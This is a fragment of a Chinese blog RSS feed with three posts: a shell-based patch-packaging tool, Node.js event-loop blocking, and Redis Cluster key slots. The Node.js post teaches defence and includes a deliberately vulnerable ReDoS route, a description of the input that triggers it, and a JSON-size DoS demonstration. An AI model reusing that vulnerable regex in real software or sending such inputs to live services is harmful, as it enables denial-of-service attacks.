&lt;span&gt; 2&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; [ &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;${tarpath/:/}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; == &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$tarpath&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; ]; &lt;span&gt;then&lt;/span&gt; 
&lt;span&gt; 3&lt;/span&gt;     # not contain &lt;span&gt;'&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, a relative path
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt;     # prefix ./ to avoid generate root &lt;span&gt;dir&lt;/span&gt; &lt;span&gt;in&lt;/span&gt;&lt;span&gt; 7z
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt;     tarpath=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;./$tarpath&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt; 6&lt;/span&gt; &lt;span&gt;fi&lt;/span&gt;
&lt;span&gt; 7&lt;/span&gt; 
&lt;span&gt; 8&lt;/span&gt; $win32/7z a &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$setupdir.7z&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$tarpath&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt; 9&lt;/span&gt; resp=$?
&lt;span&gt;10&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; [ -z &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$setupdir.7z&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; ]; &lt;span&gt;then&lt;/span&gt; 
&lt;span&gt;11&lt;/span&gt;     &lt;span&gt;echo&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;compressing failed: $resp&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;12&lt;/span&gt;     exit &lt;span&gt;2&lt;/span&gt;
&lt;span&gt;13&lt;/span&gt; &lt;span&gt;fi&lt;/span&gt;
&lt;span&gt;14&lt;/span&gt; 
&lt;span&gt;15&lt;/span&gt; &lt;span&gt;mv&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$setupdir.7z&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$outdir/$setupdir-$version-$sp.7z&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;16&lt;/span&gt; #&lt;span&gt;echo&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;create 7zip compress packet OK&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;17&lt;/span&gt; exit &lt;span&gt;0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;这里没有使用 tar cvzf 来生成 setup.tar.gz 文件，因为升级客户端只能接收 7z 格式的压缩包，这里使用 win32 版本的 7z 命令执行压缩过程。从另外的角度来讲，7z 压缩算法也是目前压缩率最高的算法，可以有效的降低网络传输的流量（7z 压缩率亲测高于 zip 及 gz）。这段代码比较简单，就不展开讲解了，最后会生成下面这样的文件结构：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:false;&quot;&gt;
$ ls -lhrt
total 348M
drwxr-xr-x 1 yunh 1049089    0 11月 17 19:18 setup/
-rw-r--r-- 1 yunh 1049089 147K 11月 17 19:19 upgrade.json
-rw-r--r-- 1 yunh 1049089 348M 11月 17 19:19 setup-1.8.0.0-0.7z
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;所有需要添加和替换的文件都会被放在 setup 目录下，这样在递归替换时就可以避免将无关文件（例如 upgrade.json）替换到安装目录。生成的压缩包命名方式为：setup-version-sp.7z。非 exact 模式生成的配置文件内容如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;79&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
{
  &quot;version&quot;: &quot;1.8.0.0&quot;,
  &quot;sp&quot;: &quot;0&quot;,
  &quot;actions&quot;: 
  [
     {
       &quot;type&quot;: &quot;delete&quot;,
       &quot;target&quot;: &quot;//BmRecentDocumentPathRecord.xml&quot;
     },
     {
       &quot;type&quot;: &quot;delete&quot;,
       &quot;target&quot;: &quot;/BmWelcomeTemplateFile/小别墅.gbp&quot;
     },
     {
       &quot;type&quot;: &quot;delete&quot;,
       &quot;target&quot;: &quot;/BmWelcomeTemplateFile/小别墅.png&quot;
     },
     {
       &quot;type&quot;: &quot;delete&quot;,
       &quot;target&quot;: &quot;/BmWelcomeTemplateFile/老虎窗屋顶.gbp&quot;
     },
     {
       &quot;type&quot;: &quot;delete&quot;,
       &quot;target&quot;: &quot;/BmWelcomeTemplateFile/老虎窗屋顶.png&quot;
     },
     {
       &quot;type&quot;: &quot;delete&quot;,
       &quot;target&quot;: &quot;/CadIdentifier/DBErrorReport.txt&quot;
     },
     {
       &quot;type&quot;: &quot;delete&quot;,
       &quot;target&quot;: &quot;//GPUDriverConfig.ini&quot;
     },
     {
       &quot;type&quot;: &quot;delete&quot;,
       &quot;target&quot;: &quot;//MjLicense.dll&quot;
     },
     {
       &quot;type&quot;: &quot;delete&quot;,
       &quot;target&quot;: &quot;//MjRichTextEditor.dll&quot;
     },
     {
       &quot;type&quot;: &quot;delete&quot;,
       &quot;target&quot;: &quot;//MjUIArchitecture.dll&quot;
     },
     {
       &quot;type&quot;: &quot;delete&quot;,
       &quot;target&quot;: &quot;//Packing4Rendering.dll&quot;
     },
     {
       &quot;type&quot;: &quot;delete&quot;,
       &quot;target&quot;: &quot;//QProfile.txt&quot;
     },
     {
       &quot;type&quot;: &quot;delete&quot;,
       &quot;target&quot;: &quot;//RecentDocumentPathRecord.xml&quot;
     },
     {
       &quot;type&quot;: &quot;delete&quot;,
       &quot;target&quot;: &quot;//ViewerConfig.ini&quot;
     },
     {
       &quot;type&quot;: &quot;delete&quot;,
       &quot;target&quot;: &quot;//algorithmLog.ini&quot;
     },
     {
       &quot;type&quot;: &quot;delete&quot;,
       &quot;target&quot;: &quot;//gdpcore.1.txt&quot;
     },
     {
       &quot;type&quot;: &quot;delete&quot;,
       &quot;target&quot;: &quot;//gdpcore.txt&quot;
     },
     {
       &quot;type&quot;: &quot;delete&quot;,
       &quot;target&quot;: &quot;/sdk/QProfile.txt&quot;
     },
     {
       &quot;type&quot;: &quot;delete&quot;,
       &quot;target&quot;: &quot;/sdk/ViewerConfig.ini&quot;
     },
     {
       &quot;type&quot;: &quot;delete&quot;,
       &quot;target&quot;: &quot;/sdk/algorithmLog.ini&quot;
     },
     {
       &quot;type&quot;: &quot;add_dir&quot;,
       &quot;target&quot;: &quot;.&quot;,
       &quot;source&quot;: &quot;setup&quot;
     }
  ]
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 所有新增及替换操作，全在最后一条 add_dir 配置项了。如果是 exact 模式的话，配置文件就会大很多了，它会针对每个新增、替换项生成一个类似上面删除项的条目，这里就不多做演示了。&lt;/p&gt;
&lt;h2&gt;用户图形界面&lt;/h2&gt;
&lt;p&gt;上面的脚本只能通过命令行界面 (CUI) 调用，那能不能将它嵌入到用户图形界面 (GUI) 呢？答案是可以的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1707550/202011/1707550-20201118135340378-1723673308.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt;上面这个程序是&lt;strong&gt;真的&lt;/strong&gt;只做了界面。在获取用户完整输入后，它创建了一个匿名管道 (CreatePipe)，并将管道的一端作为新进程的标准输出 (stdout)、同时用参数构造新进程的命令行 (上面的脚本 diffpacker.sh 作为第一参数) 来启动 bash.exe 进程。当脚本在运行中产生输出时，程序通过匿名管道读取这些输出，并将它们重定向到 UI 底部的输出框，达到实时查看脚本输出的效果。&lt;/p&gt;

&lt;p&gt;由于不涉及到后台接口，这个小工具中的脚本、调用到的命令及图形界面源码和可执行程序都是可以完整下载的：&lt;a href=&quot;https://files.cnblogs.com/files/goodcitizen/diffpacker.zip&quot; target=&quot;_blank&quot;&gt;https://files.cnblogs.com/files/goodcitizen/diffpacker.zip&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;有类似需求的同学，改改脚本就可以用啦。其中用到了 msys2，它是一个运行在 windows 上的 bash，我们常用的 git 就使用它作为 git bash 的技术支撑。之前我的不少文章也都涉及过它：&lt;/p&gt;
&lt;p&gt;《&lt;a id=&quot;PostsList1_rpPosts_TitleUrl_4&quot; class=&quot;vertical-middle&quot; href=&quot;https://www.cnblogs.com/goodcitizen/p/cnblogs_score_and_ranking_trend_chart.html&quot;&gt;查看博客园积分与排名趋势图的工具&lt;/a&gt; 》、《&lt;a id=&quot;PostsList1_rpPosts_TitleUrl_1&quot; class=&quot;vertical-middle&quot; href=&quot;https://www.cnblogs.com/goodcitizen/p/do_restful_api_monitoring_by_shell_scripts.html&quot;&gt;用 shell 脚本做 restful api 接口监控&lt;/a&gt; 》、《&lt;a id=&quot;PostsList1_rpPosts_TitleUrl_3&quot; class=&quot;vertical-middle&quot; href=&quot;https://www.cnblogs.com/goodcitizen/p/striping_log_file_by_shell_scripts.html&quot;&gt;用 shell 脚本做日志清洗&lt;/a&gt; 》，感兴趣的可以参考一下。&lt;/p&gt;
&lt;p&gt;下面是 msys2 的主页，可以从这里获取 Windows 上的安装包：&lt;a href=&quot;https://www.msys2.org/&quot; target=&quot;_blank&quot;&gt;https://www.msys2.org/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;这个小工具后来在业务线得到了广泛使用，在某个大产品使用过程中还引发了一次血案，关于该案，我现在给大家梳理一下：&lt;/p&gt;
&lt;p&gt;产品组有两个 dll 分别封装了基类 (base.dll) 和派生类 (derived.dll)；有一次产品组为基类添加了两个成员作为补丁版本，在 diff 过程中成功的识别出了 base.dll 被修改，但是没有将 derived.dll 识别出来，然后就这样没有经由本地验证就向外发布了；结果导致打过补丁的版本一启动就崩溃了，原因是 derived.dll 中旧的派生类和 base.dll 中新的基类二进制不兼容了。&lt;/p&gt;
&lt;p&gt;后来他们通过紧急补丁修复了上述问题，在后面复盘问题的过程中，我手动检查了脚本的运行日志，发现确实没有识别出新旧 derived.dll —— 脚本认为它们是二进制相同的。后来查询了一些相关资料，了解到我的 dumpbin /disasm 只是反编译了可执行文件中的代码段，而其它一些段 (例如数据段) 则被遗漏了。上面这个例子中，父类的成员变化后，肯定会有相应的 section 会做出调整，但是我通过调整 dumpbin 的选项也没有对比出这个段在哪里。后来尝试使用 msys2 自带的 objdump 命令去反编译，它确实可以得到更丰富的内容，从而判断出新旧 derived.dll 是不同的，但验证同一段相同代码编译两次生成的 dll 进行对比时，它仍然会告诉我两个 dll 不同！所以我不能简单的使用 objdump 替换 dumpbin，因为如果它报告所有 dll 都不同的话，这实际上就没有意义了。最后，这段代码还是带着 bug 继续“上岗”了，产品组现在多了一个心眼儿，每次生成 patch 后都会亲自做一下验证。&lt;/p&gt;
&lt;p&gt;这个故事从侧面说明之前产品组对我的工具的信任程度 —— 那是毫无保留信任啊，哈哈。然而我做这个小工具花了多长时间呢？其实也就一周左右，而且有很多时间是花费在调试 windows 与 shell 的一些不兼容之处，真正写业务代码也就不到一周。如果换作用 c++ 来写呢，我恐怕没有一个月是搞不定的了，这就是使用现成组件“搭积木”带来的效率优势。而 shell 作为各个命令之间的粘合剂，为实现这种装配式的开发提供了必要的支撑。现在回头来看 linux 的设计哲学 —— “有众多单一目的的小程序，一个程序只实现一个功能，多个程序组合完成复杂任务” —— 的的确确是一个法宝啊。&lt;/p&gt;
&lt;/div&gt;</description>
<pubDate>Tue, 02 Feb 2021 00:32:00 +0000</pubDate>
<dc:creator>goodcitizen</dc:creator>
<og:description>shell 除了处理一下文本，还有什么想象空间呢？今天拿一个补丁包开刀……</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/goodcitizen/p/compare_two_dir_and_generate_patch_package_by_shell_scripts.html</dc:identifier>
</item>
<item>
<title>不要在nodejs中阻塞event loop - flydean</title>
<link>http://www.cnblogs.com/flydean/p/14360147.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/flydean/p/14360147.html</guid>
<description>&lt;p&gt;为什么我们不要在nodejs中阻塞event loop&lt;/p&gt;

&lt;p&gt;我们知道event loop是nodejs中事件处理的基础，event loop中主要运行的初始化和callback事件。除了event loop之外，nodejs中还有Worker Pool用来处理一些耗时的操作，比如I/O操作。&lt;/p&gt;
&lt;p&gt;nodejs高效运行的秘诀就是使用异步IO从而可以使用少量的线程来处理大量的客户端请求。&lt;/p&gt;
&lt;p&gt;而同时，因为使用了少量的线程，所以我们在编写nodejs程序的时候，一定要特别小心。&lt;/p&gt;

&lt;p&gt;在nodejs中有两种类型的线程。第一类线程就是Event Loop也可以被称为主线程，第二类就是一个Worker Pool中的n个Workers线程。&lt;/p&gt;
&lt;p&gt;如果这两种线程执行callback花费了太多的时间，那么我们就可以认为这两个线程被阻塞了。&lt;/p&gt;
&lt;p&gt;线程阻塞第一方面会影响程序的性能，因为某些线程被阻塞，就会导致系统资源的占用。因为总的资源是有限的，这样就会导致处理其他业务的资源变少，从而影响程序的总体性能。&lt;/p&gt;
&lt;p&gt;第二方面，如果经常会有线程阻塞的情况，很有可能被恶意攻击者发起DOS攻击，导致正常业务无法进行。&lt;/p&gt;
&lt;p&gt;nodejs使用的是事件驱动的框架，Event Loop主要用来处理为各种事件注册的callback，同时也负责处理非阻塞的异步请求，比如网络I/O。&lt;/p&gt;
&lt;p&gt;而由libuv实现的Worker Pool主要对外暴露了提交task的API，从而用来处理一些比较昂贵的task任务。这些任务包括CPU密集性操作和一些阻塞型IO操作。&lt;/p&gt;
&lt;p&gt;而nodejs本身就有很多模块使用的是Worker Pool。&lt;/p&gt;
&lt;p&gt;比如IO密集型操作：&lt;/p&gt;
&lt;p&gt;DNS模块中的dns.lookup(), dns.lookupService()。&lt;/p&gt;
&lt;p&gt;和除了fs.FSWatcher()和 显式同步的文件系统的API之外，其他多有的File system模块都是使用的Worker Pool。&lt;/p&gt;
&lt;p&gt;CPU密集型操作：&lt;/p&gt;
&lt;p&gt;Crypto模块：crypto.pbkdf2(), crypto.scrypt(), crypto.randomBytes(), crypto.randomFill(), crypto.generateKeyPair()。&lt;/p&gt;
&lt;p&gt;Zlib模块：除了显示同步的API之外，其他的API都是用的是worker pool。&lt;/p&gt;
&lt;p&gt;一般来说使用Worker Pool的模块就是这些了，除此之外，你还可以使用nodejs的C++ add-on来自行提交任务到Worker Pool。&lt;/p&gt;
&lt;h2 id=&quot;event-loop和worker-pool中的queue&quot;&gt;event loop和worker pool中的queue&lt;/h2&gt;
&lt;p&gt;在之前的文件中，我们讲到了event loop中使用queue来存储event的callback，实际上这种描述是不准确的。&lt;/p&gt;
&lt;p&gt;event loop实际上维护的是一个文件描述符集合。这些文件描述符使用的是操作系统内核的 epoll (Linux), kqueue (OSX), event ports (Solaris), 或者 IOCP (Windows)来对事件进行监听。&lt;/p&gt;
&lt;p&gt;当操作系统检测到事件准备好之后，event loop就会调用event所绑定的callback事件，最终执行callback。&lt;/p&gt;
&lt;p&gt;相反的，worker pool就真的是保存了要执行的任务队列，这些任务队列中的任务由各个worker来执行。当执行完毕之后，Woker将会通知Event Loop该任务已经执行完毕。&lt;/p&gt;

&lt;p&gt;因为nodejs中的线程有限，如果某个线程被阻塞，就可能会影响到整个应用程序的执行，所以我们在程序设计的过程中，一定要小心的考虑event loop和worker pool，避免阻塞他们。&lt;/p&gt;
&lt;p&gt;event loop主要关注的是用户的连接和响应用户的请求，如果event loop被阻塞，那么用户的请求将会得不到及时响应。&lt;/p&gt;
&lt;p&gt;因为event loop主要执行的是callback，所以，我们的callback执行时间一定要短。&lt;/p&gt;
&lt;h2 id=&quot;event-loop的时间复杂度&quot;&gt;event loop的时间复杂度&lt;/h2&gt;
&lt;p&gt;时间复杂度一般用在判断一个算法的运行速度上，这里我们也可以借助时间复杂度这个概念来分析一下event loop中的callback。&lt;/p&gt;
&lt;p&gt;如果所有的callback中的时间复杂度都是一个常量的话，那么我们可以保证所有的callback都可以很公平的被执行。&lt;/p&gt;
&lt;p&gt;但是如果有些callback的时间复杂度是变化的，那么就需要我们仔细考虑了。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-js&quot;&gt;app.get('/constant-time', (req, res) =&amp;gt; {
  res.sendStatus(200);
});
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;先看一个常量时间复杂度的情况，上面的例子中我们直接设置了respose的status，是一个常量时间操作。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-js&quot;&gt;app.get('/countToN', (req, res) =&amp;gt; {
  let n = req.query.n;

  // n iterations before giving someone else a turn
  for (let i = 0; i &amp;lt; n; i++) {
    console.log(`Iter ${i}`);
  }

  res.sendStatus(200);
});
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上面的例子是一个O(n)的时间复杂度，根据request中传入的n的不同，我们可以得到不同的执行时间。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-js&quot;&gt;app.get('/countToN2', (req, res) =&amp;gt; {
  let n = req.query.n;

  // n^2 iterations before giving someone else a turn
  for (let i = 0; i &amp;lt; n; i++) {
    for (let j = 0; j &amp;lt; n; j++) {
      console.log(`Iter ${i}.${j}`);
    }
  }

  res.sendStatus(200);
});
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上面的例子是一个O(n^2)的时间复杂度。&lt;/p&gt;
&lt;p&gt;这种情况应该怎么处理呢？首先我们需要估算出系统能够承受的响应极限值，并且设定用户传入的参数极限值，如果用户传入的数据太长，超出了我们的处理范围，则可以直接从用户输入端进行限制，从而保证我们的程序的正常运行。&lt;/p&gt;
&lt;h2 id=&quot;event-loop中不推荐使用的nodejs核心模块&quot;&gt;Event Loop中不推荐使用的Node.js核心模块&lt;/h2&gt;
&lt;p&gt;在nodejs中的核心模块中，有一些方法是同步的阻塞API，使用起来开销比较大，比如压缩，加密，同步IO，子进程等等。&lt;/p&gt;
&lt;p&gt;这些API的目的是供我们在REPL环境中使用的，我们不应该直接在服务器端程序中使用他们。&lt;/p&gt;
&lt;p&gt;有哪些不推荐在server端使用的API呢？&lt;/p&gt;
&lt;ul readability=&quot;1&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;Encryption:&lt;br/&gt;crypto.randomBytes (同步版本)&lt;br/&gt;crypto.randomFillSync&lt;br/&gt;crypto.pbkdf2Sync&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;Compression:&lt;br/&gt;zlib.inflateSync&lt;br/&gt;zlib.deflateSync&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;File system:&lt;br/&gt;不要使用fs的同步API&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;Child process:&lt;br/&gt;child_process.spawnSync&lt;br/&gt;child_process.execSync&lt;br/&gt;child_process.execFileSync&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;partitioning-或者-offloading&quot;&gt;partitioning 或者 offloading&lt;/h2&gt;
&lt;p&gt;为了不阻塞event loop，同时给其他event一些运行机会，我们实际上有两种解决办法，那就是partitioning和offloading。&lt;/p&gt;
&lt;p&gt;partitioning就是分而治之，把一个长的任务，分成几块，每次执行一块，同时给其他的event一些运行时间，从而不再阻塞event loop。&lt;/p&gt;
&lt;p&gt;举个例子：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-js&quot;&gt;for (let i = 0; i &amp;lt; n; i++)
  sum += i;
let avg = sum / n;
console.log('avg: ' + avg);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;比如我们要计算n个数的平均数。上面的例子中我们的时间复杂度是O(n)。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-js&quot;&gt;function asyncAvg(n, avgCB) {
  // Save ongoing sum in JS closure.
  var sum = 0;
  function help(i, cb) {
    sum += i;
    if (i == n) {
      cb(sum);
      return;
    }

    // &quot;Asynchronous recursion&quot;.
    // Schedule next operation asynchronously.
    setImmediate(help.bind(null, i+1, cb));
  }

  // Start the helper, with CB to call avgCB.
  help(1, function(sum){
      var avg = sum/n;
      avgCB(avg);
  });
}

asyncAvg(n, function(avg){
  console.log('avg of 1-n: ' + avg);
});
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里我们用到了setImmediate，将sum的任务分解成一步一步的。虽然asyncAvg需要执行很多次，但是每一次的event loop都可以保证不被阻塞。&lt;/p&gt;
&lt;p&gt;partitioning虽然逻辑简单，但是对于一些大型的计算任务来说，并不合适。并且partitioning本身还是运行在event loop中的，它并没有享受到多核系统带来的优势。&lt;/p&gt;
&lt;p&gt;这个时候我们就需要将任务offloading到worker Pool中。&lt;/p&gt;
&lt;p&gt;使用Worker Pool有两种方式，第一种就是使用nodejs自带的Worker Pool，我们可以自行开发C++ addon或者node-webworker-threads。&lt;/p&gt;
&lt;p&gt;第二种方式就是自行创建Worker Pool，我们可以使用Child Process 或者 Cluster来实现。&lt;/p&gt;
&lt;p&gt;当然offloading也有缺点，它的最大缺点就是和Event Loop的交互损失。&lt;/p&gt;

&lt;p&gt;nodejs是运行在V8引擎上的，通常来说V8引擎已经足够优秀足够快了，但是还是存在两个例外，那就是正则表达式和JSON操作。&lt;/p&gt;
&lt;h2 id=&quot;redos正则表达式dos攻击&quot;&gt;REDOS正则表达式DOS攻击&lt;/h2&gt;
&lt;p&gt;正则表达式有什么问题呢？正则表达式有一个悲观回溯的问题。&lt;/p&gt;
&lt;p&gt;什么是悲观回溯呢？&lt;/p&gt;
&lt;p&gt;我们举个例子，假如大家对正则表达式已经很熟悉了。&lt;/p&gt;
&lt;p&gt;假如我们使用/^(x*)y$/ 来和字符串xxxxxxy来进行匹配。&lt;/p&gt;
&lt;p&gt;匹配之后第一个分组（也就是括号里面的匹配值）是xxxxxx。&lt;/p&gt;
&lt;p&gt;如果我们把正则表达式改写为 /^(x*)xy$/ 再来和字符串xxxxxxy来进行匹配。 匹配的结果就是xxxxx。&lt;/p&gt;
&lt;p&gt;这个过程是怎么样的呢？&lt;/p&gt;
&lt;p&gt;首先(x&lt;em&gt;)会尽可能的匹配更多的x，知道遇到字符y。 这时候(x&lt;/em&gt;)已经匹配了6个x。&lt;/p&gt;
&lt;p&gt;接着正则表达式继续执行(x&lt;em&gt;)之后的xy，发现不能匹配，这时候(x&lt;/em&gt;)需要从已经匹配的6个x中，吐出一个x，然后重新执行正则表达式中的xy，发现能够匹配，正则表达式结束。&lt;/p&gt;
&lt;p&gt;这个过程就是一个回溯的过程。&lt;/p&gt;
&lt;p&gt;如果正则表达式写的不好，那么就有可能会出现悲观回溯。&lt;/p&gt;
&lt;p&gt;还是上面的例子，但是这次我们用/^(x*)y$/ 来和字符串xxxxxx来进行匹配。&lt;/p&gt;
&lt;p&gt;按照上面的流程，我们知道正则表达式需要进行6次回溯，最后匹配失败。&lt;/p&gt;
&lt;p&gt;考虑一些极端的情况，可能会导致回溯一个非常大的次数，从而导致CPU占用率飙升。&lt;/p&gt;
&lt;p&gt;我们称正则表达式的DOS攻击为REDOS。&lt;/p&gt;
&lt;p&gt;举个nodejs中REDOS的例子：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-js&quot;&gt;app.get('/redos-me', (req, res) =&amp;gt; {
  let filePath = req.query.filePath;

  // REDOS
  if (filePath.match(/(\/.+)+$/)) {
    console.log('valid path');
  }
  else {
    console.log('invalid path');
  }

  res.sendStatus(200);
});
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上面的callback中，我们本意是想匹配 /a/b/c这样的路径。但是如果用户输入filePath=///.../\n，假如有100个/,最后跟着换行符。&lt;/p&gt;
&lt;p&gt;那么将会导致正则表达式的悲观回溯。因为&lt;code&gt;.&lt;/code&gt;表示的是匹配除换行符 \n 之外的任何单字符。但是我们只到最后才发现不能够匹配，所以产生了REDOS攻击。&lt;/p&gt;
&lt;p&gt;如何避免REDOS攻击呢？&lt;/p&gt;
&lt;p&gt;一方面有一些现成的正则表达式模块，我们可以直接使用，比如safe-regex，rxxr2和node-re2等。&lt;/p&gt;
&lt;p&gt;一方面可以到www.regexlib.com网站上查找要使用的正则表达式规则，这些规则是经过验证的，可以减少自己编写正则表达式的失误。&lt;/p&gt;
&lt;h2 id=&quot;json-dos攻击&quot;&gt;JSON DOS攻击&lt;/h2&gt;
&lt;p&gt;通常我们会使用JSON.parse 和 JSON.stringify 这两个JSON常用的操作，但是这两个操作的时间是和输入的JSON长度相关的。&lt;/p&gt;
&lt;p&gt;举个例子：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-js&quot;&gt;var obj = { a: 1 };
var niter = 20;

var before, str, pos, res, took;

for (var i = 0; i &amp;lt; niter; i++) {
  obj = { obj1: obj, obj2: obj }; // Doubles in size each iter
}

before = process.hrtime();
str = JSON.stringify(obj);
took = process.hrtime(before);
console.log('JSON.stringify took ' + took);

before = process.hrtime();
pos = str.indexOf('nomatch');
took = process.hrtime(before);
console.log('Pure indexof took ' + took);

before = process.hrtime();
res = JSON.parse(str);
took = process.hrtime(before);
console.log('JSON.parse took ' + took);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上面的例子中我们对obj进行解析操作，当然这个obj比较简单，如果用户传入了一个超大的json文件，那么就会导致event loop的阻塞。&lt;/p&gt;
&lt;p&gt;解决办法就是限制用户的输入长度。或者使用异步的JSON API：比如JSONStream和Big-Friendly JSON。&lt;/p&gt;

&lt;p&gt;nodejs的理念就是用最小的线程来处理最大的客户连接。上面我们也讲过了要把复杂的操作放到Worker Pool中来借助线程池的优势来运行。&lt;/p&gt;
&lt;p&gt;但是线程池中的线程个数也是有限的。如果某一个线程执行了一个long run task，那么就等于线程池中少了一个worker线程。&lt;/p&gt;
&lt;p&gt;恶意攻击者实际上是可以抓住系统的这个弱点，来实施DOS攻击。&lt;/p&gt;
&lt;p&gt;所以对Worker Pool中long run task的最优解决办法就是partitioning。从而让所有的任务都有平等的执行机会。&lt;/p&gt;
&lt;p&gt;当然，如果你可以很清楚的区分short task和long run task，那么我们实际上可以分别构造不同的worker Pool来分别为不同的task任务类型服务。&lt;/p&gt;

&lt;p&gt;event loop和worker pool是nodejs中两种不同的事件处理机制，我们需要在程序中根据实际问题来选用。&lt;/p&gt;
&lt;blockquote readability=&quot;10.109589041096&quot;&gt;
&lt;p&gt;本文作者：flydean程序那些事&lt;/p&gt;
&lt;p&gt;本文链接：&lt;a href=&quot;http://www.flydean.com/nodejs-block-eventloop/&quot; target=&quot;_blank&quot;&gt;http://www.flydean.com/nodejs-block-eventloop/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本文来源：flydean的博客&lt;/p&gt;
&lt;p&gt;欢迎关注我的公众号:「程序那些事」最通俗的解读，最深刻的干货，最简洁的教程，众多你不知道的小技巧等你来发现！&lt;/p&gt;
&lt;/blockquote&gt;
</description>
<pubDate>Mon, 01 Feb 2021 23:32:00 +0000</pubDate>
<dc:creator>flydean</dc:creator>
<og:description>为什么我们不要在nodejs中阻塞event loop 简介 我们知道event loop是nodejs中事件处理的基础，event loop中主要运行的初始化和callback事件。除了event</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/flydean/p/14360147.html</dc:identifier>
</item>
<item>
<title>知道 Redis-Cluster 么？说说其中可能不可用的情况 - 干货满满张哈希</title>
<link>http://www.cnblogs.com/zhxdick/p/14360095.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/zhxdick/p/14360095.html</guid>
<description>&lt;p&gt;一个集群模式的官方推荐最小最佳实践方案是 6 个节点，3 个 Master 3 个 Slave 的模式，如 图00 所示。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://zhxhash-blog.oss-cn-beijing.aliyuncs.com/Redis/Redis-Cluster/00.%20RedisMinimalCluster.png&quot; alt=&quot;image&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;key-分槽与转发机制&quot;&gt;key 分槽与转发机制&lt;/h2&gt;
&lt;p&gt;Redis 将键空间分为了 16384 个槽，通过以下算法确定每一个 key 的槽：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;CRC16(key) mod 16384
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;由于 16384 = 2 的 14 次方，对一个 2 的 n 次方取余相当于对于它的 2 的 n 次方减一取与运算。所以优化为：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;CRC16(key) &amp;amp; 16383
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;当 key 包含 hash tags 的时候（例如 &lt;code&gt;key{sub}1&lt;/code&gt;），会以 sub tags 中指定的字符串（就是 sub ）计算槽，所以&lt;code&gt;key{sub}1&lt;/code&gt;和&lt;code&gt;key{sub}2&lt;/code&gt;会到同一个槽中。&lt;/p&gt;
